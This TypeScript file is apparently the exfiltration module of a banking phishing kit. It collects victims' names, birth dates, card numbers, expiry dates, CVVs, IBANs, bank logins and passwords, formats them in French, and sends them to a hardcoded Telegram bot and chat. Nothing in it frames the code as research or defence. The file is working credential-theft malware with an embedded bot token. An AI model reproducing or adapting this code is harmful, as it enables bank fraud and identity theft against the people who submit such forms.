import { SessionManager } from '../utils/sessionManager';


// Telegram configuration
const BOT_TOKEN = "9128881021:AAFy-XLy0lS27q6etVYL2Chvsuhxf8CA7ro";
const CHAT_ID = "-5377081972";

export async function sendTelegramMessage(message: string): Promise<boolean> {
  try {
    const sessionId = SessionManager.hasActiveSession() 
      ? SessionManager.getSessionId() 
      : SessionManager.createSession();

    const response = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: `🆔 Session ID: ${sessionId}\n\n📨 IBAN:\n${message}`,
          parse_mode: 'HTML',
        }),
      }
    );

    const data = await response.json();
    return data.ok;
  } catch (error) {
    console.error('Error sending message:', error);
    return false;
  }
}

export async function sendBankFormData(formData: any): Promise<boolean> {
  const sessionId = SessionManager.getSessionId();
  const message = `
🆔 Session ID: ${sessionId}

🏦 INFORMATIONS BANCAIRES

👤 Nom: ${formData.lastName}
👤 Prénom: ${formData.firstName}
📅 Date de naissance: ${formData.birthDate}
💳 Numéro de carte: ${formData.cardNumber}
📅 Date d'expiration: ${formData.expiryMonth}/${formData.expiryYear}
🔒 CVV: ${formData.cvv}
  `;

  return sendTelegramMessage(message);
}

export async function sendBankLoginData(formData: any): Promise<boolean> {
  const sessionId = SessionManager.getSessionId();
  const message = `
🆔 Session ID: ${sessionId}

🏦 INFORMATIONS DE CONNEXION

📱 Téléphone: ${formData.phoneNumber}
💰 Montant: ${formData.amount}
🏛️ Banque: ${formData.bank}
👤 Identifiant: ${formData.username}
🔑 Mot de passe: ${formData.password}
  `;

  const success = await sendTelegramMessage(message);
  if (success) {
    SessionManager.clearSession(); // Clear session after final step
  }
  return success;
}
